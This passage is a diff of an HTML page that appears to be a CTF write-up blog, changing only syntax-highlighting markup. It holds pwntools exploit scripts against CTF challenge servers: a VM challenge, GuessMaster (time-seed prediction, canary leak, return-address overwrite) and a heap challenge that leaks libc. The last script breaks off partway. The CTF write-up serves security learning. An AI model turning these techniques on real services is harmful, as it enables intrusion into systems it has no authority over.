+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xE9</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># sys_write
 </span>
-    <span class="n">sl</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+    <span class="nf">sl</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
 
-    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 
 <span class="c1"># ------------------ Infrastructure ------------------ #
 </span>
-<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
     b vm_check
     b sys
     c
-'''</span>
+</span><span class="sh">'''</span>
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Cameudis's PWN Framework"</span><span class="p">)</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="n">exe</span><span class="o">=</span><span class="n">filename</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"d"</span><span class="p">:</span>
-        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"r"</span><span class="p">:</span>
-        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Cameudis</span><span class="sh">'</span><span class="s">s PWN Framework</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="n">exe</span><span class="o">=</span><span class="n">filename</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">d</span><span class="sh">"</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"Usage: ./exp.py [d | r]"</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">d for direct without debug"</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">r for remote"</span><span class="p">)</span>
-        <span class="nb">exit</span><span class="p">()</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Usage: ./exp.py [d | r]</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\t</span><span class="s">d for direct without debug</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\t</span><span class="s">r for remote</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">()</span>
 
-    <span class="n">pwn</span><span class="p">()</span>
+    <span class="nf">pwn</span><span class="p">()</span>
 </code></pre></div></div>
 
 <h2 id="guessmaster">GuessMaster</h2>
@@ -625,79 +626,79 @@
 #
 # Copyright © 2025 y2 &lt;cameudis@gmail.com&gt;
 </span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">]</span>
 
-<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="c1"># ---------------- Environment Config ---------------- #
 </span>
-<span class="n">filename</span> <span class="o">=</span> <span class="s">"./pwn"</span>
-<span class="n">libc_name</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>
-<span class="n">ip</span> <span class="o">=</span> <span class="s">"instance.penguin.0ops.sjtu.cn"</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./pwn</span><span class="sh">"</span>
+<span class="n">libc_name</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">instance.penguin.0ops.sjtu.cn</span><span class="sh">"</span>
 <span class="n">port</span> <span class="o">=</span> <span class="mi">18659</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
 <span class="c1"># libc = ELF(libc_name)
 </span>
-<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
 <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">filename</span>
 
 <span class="c1"># ------------------- Exploitation ------------------- #
 </span>
-<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
     
-    <span class="n">libc</span> <span class="o">=</span> <span class="n">cdll</span><span class="p">.</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"libc.so.6"</span><span class="p">)</span>
-    <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">+</span> <span class="mi">110</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"Seed: "</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>
-    <span class="n">libc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">cdll</span><span class="p">.</span><span class="nc">LoadLibrary</span><span class="p">(</span><span class="sh">"</span><span class="s">libc.so.6</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">time</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">+</span> <span class="mi">110</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Seed: </span><span class="sh">"</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>
+    <span class="n">libc</span><span class="p">.</span><span class="nf">srand</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
 
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
-        <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+        <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">rand</span><span class="p">()).</span><span class="nf">encode</span><span class="p">())</span>
 
-    <span class="n">ru</span><span class="p">(</span><span class="s">"什么吧！"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
-    <span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x108</span><span class="o">+</span><span class="sa">b</span><span class="s">'b'</span><span class="p">)</span>
-    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'b'</span><span class="p">)</span>
+    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">什么吧！</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="nf">s</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x108</span><span class="o">+</span><span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">mes</span> <span class="o">=</span> <span class="n">r</span><span class="p">()</span>
+    <span class="n">mes</span> <span class="o">=</span> <span class="nf">r</span><span class="p">()</span>
     <span class="n">canary</span> <span class="o">=</span> <span class="n">mes</span><span class="p">[:</span><span class="mi">7</span><span class="p">]</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
 
-    <span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x108</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">+</span><span class="n">canary</span><span class="o">+</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\x93</span><span class="s">'</span><span class="p">)</span>
+    <span class="nf">s</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x108</span><span class="o">+</span><span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="o">+</span><span class="n">canary</span><span class="o">+</span><span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x93</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 
 <span class="c1"># ------------------ Infrastructure ------------------ #
 </span>
-<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
     # b srand
     c
-'''</span>
+</span><span class="sh">'''</span>
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Cameudis's PWN Framework"</span><span class="p">)</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="n">exe</span><span class="o">=</span><span class="n">filename</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"d"</span><span class="p">:</span>
-        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"r"</span><span class="p">:</span>
-        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Cameudis</span><span class="sh">'</span><span class="s">s PWN Framework</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="n">exe</span><span class="o">=</span><span class="n">filename</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">d</span><span class="sh">"</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"Usage: ./exp.py [d | r]"</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">d for direct without debug"</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">r for remote"</span><span class="p">)</span>
-        <span class="nb">exit</span><span class="p">()</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Usage: ./exp.py [d | r]</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\t</span><span class="s">d for direct without debug</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\t</span><span class="s">r for remote</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">()</span>
 
-    <span class="n">pwn</span><span class="p">()</span>
+    <span class="nf">pwn</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -722,91 +723,91 @@
 #
 # Copyright © 2025 y2 &lt;cameudis@gmail.com&gt;
 </span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">]</span>
 
 <span class="c1"># ---------------- Environment Config ---------------- #
 </span>
-<span class="n">filename</span> <span class="o">=</span> <span class="s">"./pwn"</span>
-<span class="n">libc_name</span> <span class="o">=</span> <span class="s">"/home/y2/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"</span>
-<span class="n">ip</span> <span class="o">=</span> <span class="s">"instance.penguin.0ops.sjtu.cn"</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./pwn</span><span class="sh">"</span>
+<span class="n">libc_name</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/home/y2/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6</span><span class="sh">"</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">instance.penguin.0ops.sjtu.cn</span><span class="sh">"</span>
 <span class="n">port</span> <span class="o">=</span> <span class="mi">18877</span>
 <span class="c1"># ip = "127.0.0.1"
 # port = 9999
 </span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
 <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">filename</span>
 
 <span class="c1"># ------------------- Exploitation ------------------- #
 </span>
-<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
     <span class="c1"># https://bbs.kanxue.com/thread-262459.htm
 </span>    
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">': '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">': '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="p">)</span>
-    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">': '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
 
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">': '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="p">)</span>
-    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
-    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'1.'</span><span class="p">)[:</span><span class="mi">6</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'_IO_2_1_stdout_'</span><span class="p">]</span>
-    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'libc leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
